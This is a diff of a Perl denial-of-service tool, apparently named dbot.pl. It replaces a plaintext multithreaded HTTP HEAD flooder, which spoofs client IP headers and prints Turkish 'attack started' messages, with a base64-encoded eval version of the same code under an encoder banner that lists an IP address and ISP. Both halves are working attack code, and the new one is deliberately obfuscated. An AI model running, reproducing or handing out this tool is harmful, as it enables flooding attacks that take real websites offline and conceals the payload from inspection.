@@ -1,152 +1,103 @@
-﻿#!/usr/bin/perl
-#require_once(main.irc);
-package control;
-
-my $ip;
-
-
-sub new {
-    my ($class,$i) = @_;
-    $ip = $i;
-    my $self={};
-    $ip = $i;
-    bless $self, $class;
-    return $self;
-}
-
-sub mas {
-my ($self,$veces) = @_;
-$veces = 1 if($veces eq "");
-my ($a,$e,$o,$b) = split(/\./,$ip);
-for($as=0;$as<$veces;$as++) {
-$b++;
-if($b>=255) {$b=0;$o++;}
-if($o>=255) {$o=0;$e++;}
-if($e>=255) {$e=0;$a++;}
-die("Sem Ip!\n") if($a>=255);
-}
-$ip = join "",$a,".",$e,".",$o,".",$b;
-return $ip;
-}
-
-1;
-
-package main;
-
-use Socket;
-use IO::Socket::INET;
-use threads ('yield',
-                'exit' => 'threads_only',
-                'stringify');
-use threads::shared;
-
-my $ua = "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0";
-my $method = "HEAD";
-my $hilo;
-my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
-my $randsemilla = "";
-for($i = 0; $i < 30; $i++) {
-    $randsemilla .= $vals[int(rand($#vals))];
-}
-sub socker {
-    my ($remote,$port) = @_;
-    my ($iaddr, $paddr, $proto);
-    $iaddr = inet_aton($remote) || return false;
-    $paddr = sockaddr_in($port, $iaddr) || return false;
-    $proto = getprotobyname('tcp');
-    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
-    connect(SOCK, $paddr) || return false;
-    return SOCK;
-}
-
-
-sub sender {
-    my ($max,$puerto,$host,$file) = @_;
-    my $sock;
-    while(true) {
-        my $paquete = "";
-        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
-        unless($sock) {
-            print "\n[<?>] Saldırı Başlatıldı...\n\n";
-            sleep(1);
-            next;
-        }
-        for($i=0;$i<$porconexion;$i++) {
-            $ipinicial = $sumador->mas();
-            my $filepath = $file;
-            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
-            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
-        }
-        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
-        print $sock $paquete;
-    }
-}
-
-sub sender2 {
-    my ($puerto,$host,$paquete) = @_;
-    my $sock;
-    my $sumador :shared;
-    while(true) {
-        $sock = &socker($host,$puerto);
-        unless($sock) {
-            print "\n[<?>] Saldırı Başlatıldı...\n\n";
-            next;
-        }
-        print $sock $paquete;
-    }
-}
-
-sub comenzar {
-    $SIG{'KILL'} = sub { print "Ölü...\n"; threads->exit(); };
-    $url = $ARGV[0];
-    print "URL: ".$url."\n";
-    $max = $ARGV[1];
-    $porconexion = $ARGV[2];
-    $ipfake = $ARGV[3];
-    if($porconexion < 1) {
-        print "[-]Hazırlanıyor...\n";
-        exit;
-    }
-    if($url !~ /^http:\/\//) {
-        die("[x] URL Geçersiz!\n");
-    }
-    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
-    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
-    $puerto = 80;
-    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
-    $file =~ s/\s/ /g;
-    print join "","[!]",$max," Bot Upload!\n";
-    $file = "/".$file if($file !~ /^\//);
-    print join "","Hedef: ",$host,":",$puerto,"\nUzantı: ",$file,"\n\n";
-    print "[-]Connected irc.hxben.com ...\n";
-    if($ipfake eq "") {
-        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
-        $paquetesender = "";
-        $paquetesender = $paquetebase x $porconexion;
-        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
-        for($v=0;$v<$max;$v++) {
-            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
-        }
-    } else {
-        $sumador = control->new($ipfake);
-        for($v=0;$v<$max;$v++) {
-            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
-        }
-    }
-    print "[+]Saldırı Başladı ...\n";
-    for($v=0;$v<$max;$v++) {
-        if ($thr[$v]->is_running()) {
-            sleep(3);
-            $v--;
-        }
-    }
-    print "FIM!\n";
-}
-
-
-if($#ARGV > 2) {
-    comenzar();
-} else {
-	die("\nperl dbot.pl http://www.google.com 600 200 127.0.0.1\nAuthor : adbes - k4\n");
-
-}
+#!/usr/bin/perl
+#
+#   Cgi Encoder By Eddie Kidiw
+#   Cgi Encoder V 1.0.0 beta
+#   Ip: 37.58.59.75
+#   Host Name: 
+#   City: Berlin
+#   Country: DE
+#   Region: Land Berlin
+#   Isp: AS28753 Leaseweb Deutschland GmbH
+#   Your Browser: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+#   Date: Senin 9-Oktober-2017 03:25:38
+#
+use
+MIME::Base64;
+eval(decode_base64('IyEvdXNyL2Jpbi9wZXJsDQojcmVxdWlyZV9vbmNlKG1haW4uaXJjKTsNCnBhY2thZ2UgY29udHJv
+bDsNCg0KbXkgJGlwOw0KDQoNCnN1YiBuZXcgew0KICAgIG15ICgkY2xhc3MsJGkpID0gQF87DQog
+ICAgJGlwID0gJGk7DQogICAgbXkgJHNlbGY9e307DQogICAgJGlwID0gJGk7DQogICAgYmxlc3Mg
+JHNlbGYsICRjbGFzczsNCiAgICByZXR1cm4gJHNlbGY7DQp9DQoNCnN1YiBtYXMgew0KbXkgKCRz
+ZWxmLCR2ZWNlcykgPSBAXzsNCiR2ZWNlcyA9IDEgaWYoJHZlY2VzIGVxICIiKTsNCm15ICgkYSwk
+ZSwkbywkYikgPSBzcGxpdCgvXC4vLCRpcCk7DQpmb3IoJGFzPTA7JGFzPCR2ZWNlczskYXMrKykg
+ew0KJGIrKzsNCmlmKCRiPj0yNTUpIHskYj0wOyRvKys7fQ0KaWYoJG8+PTI1NSkgeyRvPTA7JGUr
+Kzt9DQppZigkZT49MjU1KSB7JGU9MDskYSsrO30NCmRpZSgiU2VtIElwIVxuIikgaWYoJGE+PTI1
+NSk7DQp9DQokaXAgPSBqb2luICIiLCRhLCIuIiwkZSwiLiIsJG8sIi4iLCRiOw0KcmV0dXJuICRp
+cDsNCn0NCg0KMTsNCg0KcGFja2FnZSBtYWluOw0KDQp1c2UgU29ja2V0Ow0KdXNlIElPOjpTb2Nr
+ZXQ6OklORVQ7DQp1c2UgdGhyZWFkcyAoJ3lpZWxkJywNCiAgICAgICAgICAgICAgICAnZXhpdCcg
+PT4gJ3RocmVhZHNfb25seScsDQogICAgICAgICAgICAgICAgJ3N0cmluZ2lmeScpOw0KdXNlIHRo
+cmVhZHM6OnNoYXJlZDsNCg0KbXkgJHVhID0gIk1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7
+IHJ2OjUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC81LjAiOw0KbXkgJG1ldGhvZCA9ICJIRUFE
+IjsNCm15ICRoaWxvOw0KbXkgQHZhbHMgPSAoJ2EnLCdiJywnYycsJ2QnLCdlJywnZicsJ2cnLCdo
+JywnaScsJ2onLCdrJywnbCcsJ24nLCdvJywncCcsJ3EnLCdyJywncycsJ3QnLCd1JywndycsJ3gn
+LCd5JywneicsMCwxLDIsMyw0LDUsNiw3LDgsOSk7DQpteSAkcmFuZHNlbWlsbGEgPSAiIjsNCmZv
+cigkaSA9IDA7ICRpIDwgMzA7ICRpKyspIHsNCiAgICAkcmFuZHNlbWlsbGEgLj0gJHZhbHNbaW50
+KHJhbmQoJCN2YWxzKSldOw0KfQ0Kc3ViIHNvY2tlciB7DQogICAgbXkgKCRyZW1vdGUsJHBvcnQp
+ID0gQF87DQogICAgbXkgKCRpYWRkciwgJHBhZGRyLCAkcHJvdG8pOw0KICAgICRpYWRkciA9IGlu
+ZXRfYXRvbigkcmVtb3RlKSB8fCByZXR1cm4gZmFsc2U7DQogICAgJHBhZGRyID0gc29ja2FkZHJf
+aW4oJHBvcnQsICRpYWRkcikgfHwgcmV0dXJuIGZhbHNlOw0KICAgICRwcm90byA9IGdldHByb3Rv
+YnluYW1lKCd0Y3AnKTsNCiAgICBzb2NrZXQoU09DSywgUEZfSU5FVCwgU09DS19TVFJFQU0sICRw
+cm90byk7DQogICAgY29ubmVjdChTT0NLLCAkcGFkZHIpIHx8IHJldHVybiBmYWxzZTsNCiAgICBy
+ZXR1cm4gU09DSzsNCn0NCg0KDQpzdWIgc2VuZGVyIHsNCiAgICBteSAoJG1heCwkcHVlcnRvLCRo
+b3N0LCRmaWxlKSA9IEBfOw0KICAgIG15ICRzb2NrOw0KICAgIHdoaWxlKHRydWUpIHsNCiAgICAg
+ICAgbXkgJHBhcXVldGUgPSAiIjsNCiAgICAgICAgJHNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5u
+ZXcoUGVlckFkZHIgPT4gJGhvc3QsIFBlZXJQb3J0ID0+ICRwdWVydG8sIFByb3RvID0+ICd0Y3An
+KTsNCiAgICAgICAgdW5sZXNzKCRzb2NrKSB7DQogICAgICAgICAgICBwcmludCAiXG5bPD8+XSBT
+YWxk/XL9IEJh/mxhdP1sZP0uLi5cblxuIjsNCiAgICAgICAgICAgIHNsZWVwKDEpOw0KICAgICAg
+ICAgICAgbmV4dDsNCiAgICAgICAgfQ0KICAgICAgICBmb3IoJGk9MDskaTwkcG9yY29uZXhpb247
+JGkrKykgew0KICAgICAgICAgICAgJGlwaW5pY2lhbCA9ICRzdW1hZG9yLT5tYXMoKTsNCiAgICAg
+ICAgICAgIG15ICRmaWxlcGF0aCA9ICRmaWxlOw0KICAgICAgICAgICAgJGZpbGVwYXRoID1+IHMv
+KFx7bW5cLWZha2VpcFx9KS8kaXBpbmljaWFsL2c7DQogICAgICAgICAgICAkcGFxdWV0ZSAuPSBq
+b2luICIiLCRtZXRob2QsIiAvIiwkZmlsZXBhdGgsIiBIVFRQLzEuMVxyXG5Ib3N0OiAiLCRob3N0
+LCJcclxuVXNlci1BZ2VudDogIiwkdWEsIlxyXG5DTElFTlQtSVA6ICIsJGlwaW5pY2lhbCwiXHJc
+blgtRm9yd2FyZGVkLUZvcjogIiwkaXBpbmljaWFsLCJcclxuSWYtTm9uZS1NYXRjaDogIiwkcmFu
+ZHNlbWlsbGEsIlxyXG5JZi1Nb2RpZmllZC1TaW5jZTogRnJpLCAxIERlYyAxOTY5IDIzOjAwOjAw
+IEdNVFxyXG5BY2NlcHQ6ICovKlxyXG5BY2NlcHQtTGFuZ3VhZ2U6IGVzLWVzLGVzO3E9MC44LGVu
+LXVzO3E9MC41LGVuO3E9MC4zXHJcbkFjY2VwdC1FbmNvZGluZzogZ3ppcCxkZWZsYXRlXHJcbkFj
+Y2VwdC1DaGFyc2V0OiBJU08tODg1OS0xLHV0Zi04O3E9MC43LCo7cT0wLjdcclxuQ29udGVudC1M
+ZW5ndGg6IDBcclxuQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG5cclxuIjsNCiAgICAgICAgfQ0K
+ICAgICAgICAkcGFxdWV0ZSA9fiBzL0Nvbm5lY3Rpb246IEtlZXAtQWxpdmVcclxuXHJcbiQvQ29u
+bmVjdGlvbjogQ2xvc2VcclxuXHJcbi87DQogICAgICAgIHByaW50ICRzb2NrICRwYXF1ZXRlOw0K
+ICAgIH0NCn0NCg0Kc3ViIHNlbmRlcjIgew0KICAgIG15ICgkcHVlcnRvLCRob3N0LCRwYXF1ZXRl
+KSA9IEBfOw0KICAgIG15ICRzb2NrOw0KICAgIG15ICRzdW1hZG9yIDpzaGFyZWQ7DQogICAgd2hp
+bGUodHJ1ZSkgew0KICAgICAgICAkc29jayA9ICZzb2NrZXIoJGhvc3QsJHB1ZXJ0byk7DQogICAg
+ICAgIHVubGVzcygkc29jaykgew0KICAgICAgICAgICAgcHJpbnQgIlxuWzw/Pl0gU2FsZP1y/SBC
+Yf5sYXT9bGT9Li4uXG5cbiI7DQogICAgICAgICAgICBuZXh0Ow0KICAgICAgICB9DQogICAgICAg
+IHByaW50ICRzb2NrICRwYXF1ZXRlOw0KICAgIH0NCn0NCg0Kc3ViIGNvbWVuemFyIHsNCiAgICAk
+U0lHeydLSUxMJ30gPSBzdWIgeyBwcmludCAi1mz8Li4uXG4iOyB0aHJlYWRzLT5leGl0KCk7IH07
+DQogICAgJHVybCA9ICRBUkdWWzBdOw0KICAgIHByaW50ICJVUkw6ICIuJHVybC4iXG4iOw0KICAg
+ICRtYXggPSAkQVJHVlsxXTsNCiAgICAkcG9yY29uZXhpb24gPSAkQVJHVlsyXTsNCiAgICAkaXBm
+YWtlID0gJEFSR1ZbM107DQogICAgaWYoJHBvcmNvbmV4aW9uIDwgMSkgew0KICAgICAgICBwcmlu
+dCAiWy1dSGF6/XJsYW79eW9yLi4uXG4iOw0KICAgICAgICBleGl0Ow0KICAgIH0NCiAgICBpZigk
+dXJsICF+IC9eaHR0cDpcL1wvLykgew0KICAgICAgICBkaWUoIlt4XSBVUkwgR2XnZXJzaXohXG4i
+KTsNCiAgICB9DQogICAgJHVybCAuPSAiLyIgaWYoJHVybCA9fiAvXmh0dHA/OlwvXC8oW1xkXHdc
+OlwuLV0qKSQvKTsNCiAgICAoJGhvc3QsJGZpbGUpID0gKCR1cmwgPX4gL15odHRwPzpcL1wvKC4q
+PylcLyguKikvKTsNCiAgICAkcHVlcnRvID0gODA7DQogICAgKCRob3N0LCRwdWVydG8pID0gKCRo
+b3N0ID1+IC8oLio/KTooLiopLykgaWYoJGhvc3QgPX4gLyguKj8pOiguKikvKTsNCiAgICAkZmls
+ZSA9fiBzL1xzLyAvZzsNCiAgICBwcmludCBqb2luICIiLCJbIV0iLCRtYXgsIiBCb3QgVXBsb2Fk
+IVxuIjsNCiAgICAkZmlsZSA9ICIvIi4kZmlsZSBpZigkZmlsZSAhfiAvXlwvLyk7DQogICAgcHJp
+bnQgam9pbiAiIiwiSGVkZWY6ICIsJGhvc3QsIjoiLCRwdWVydG8sIlxuVXphbnT9OiAiLCRmaWxl
+LCJcblxuIjsNCiAgICBwcmludCAiWy1dQ29ubmVjdGVkIGlyYy5oeGJlbi5jb20gLi4uXG4iOw0K
+ICAgIGlmKCRpcGZha2UgZXEgIiIpIHsNCiAgICAgICAgbXkgJHBhcXVldGViYXNlID0gam9pbiAi
+IiwkbWV0aG9kLCIgLyIsJGZpbGUsIiBIVFRQLzEuMVxyXG5Ib3N0OiAiLCRob3N0LCJcclxuVXNl
+ci1BZ2VudDogIiwkdWEsIlxyXG5JZi1Ob25lLU1hdGNoOiAiLCRyYW5kc2VtaWxsYSwiXHJcbklm
+LU1vZGlmaWVkLVNpbmNlOiBGcmksIDEgRGVjIDE5NjkgMjM6MDA6MDAgR01UXHJcbkFjY2VwdDog
+Ki8qXHJcbkFjY2VwdC1MYW5ndWFnZTogZXMtZXMsZXM7cT0wLjgsZW4tdXM7cT0wLjUsZW47cT0w
+LjNcclxuQWNjZXB0LUVuY29kaW5nOiBnemlwLGRlZmxhdGVcclxuQWNjZXB0LUNoYXJzZXQ6IElT
+Ty04ODU5LTEsdXRmLTg7cT0wLjcsKjtxPTAuN1xyXG5Db250ZW50LUxlbmd0aDogMFxyXG5Db25u
+ZWN0aW9uOiBLZWVwLUFsaXZlXHJcblxyXG4iOw0KICAgICAgICAkcGFxdWV0ZXNlbmRlciA9ICIi
+Ow0KICAgICAgICAkcGFxdWV0ZXNlbmRlciA9ICRwYXF1ZXRlYmFzZSB4ICRwb3Jjb25leGlvbjsN
+CiAgICAgICAgJHBhcXVldGVzZW5kZXIgPX4gcy9Db25uZWN0aW9uOiBLZWVwLUFsaXZlXHJcblxy
+XG4kL0Nvbm5lY3Rpb246IENsb3NlXHJcblxyXG4vOw0KICAgICAgICBmb3IoJHY9MDskdjwkbWF4
+OyR2KyspIHsNCiAgICAgICAgICAgICR0aHJbJHZdID0gdGhyZWFkcy0+Y3JlYXRlKCdzZW5kZXIy
+JywgKCRwdWVydG8sJGhvc3QsJHBhcXVldGVzZW5kZXIpKTsNCiAgICAgICAgfQ0KICAgIH0gZWxz
+ZSB7DQogICAgICAgICRzdW1hZG9yID0gY29udHJvbC0+bmV3KCRpcGZha2UpOw0KICAgICAgICBm
+b3IoJHY9MDskdjwkbWF4OyR2KyspIHsNCiAgICAgICAgICAgICR0aHJbJHZdID0gdGhyZWFkcy0+
+Y3JlYXRlKCdzZW5kZXInLCAoJHBvcmNvbmV4aW9uLCRwdWVydG8sJGhvc3QsJGZpbGUpKTsNCiAg
+ICAgICAgfQ0KICAgIH0NCiAgICBwcmludCAiWytdU2FsZP1y/SBCYf5sYWT9IC4uLlxuIjsNCiAg
+ICBmb3IoJHY9MDskdjwkbWF4OyR2KyspIHsNCiAgICAgICAgaWYgKCR0aHJbJHZdLT5pc19ydW5u
+aW5nKCkpIHsNCiAgICAgICAgICAgIHNsZWVwKDMpOw0KICAgICAgICAgICAgJHYtLTsNCiAgICAg
+ICAgfQ0KICAgIH0NCiAgICBwcmludCAiRklNIVxuIjsNCn0NCg0KDQppZigkI0FSR1YgPiAyKSB7
+DQogICAgY29tZW56YXIoKTsNCn0gZWxzZSB7DQoJZGllKCJcbnBlcmwgZGJvdC5wbCBodHRwOi8v
+d3d3Lmdvb2dsZS5jb20gNjAwIDIwMCAxMjcuMC4wLjFcbkF1dGhvciA6IGFkYmVzIC0gazRcbiIp
+Ow0KDQp9DQo=
+'));
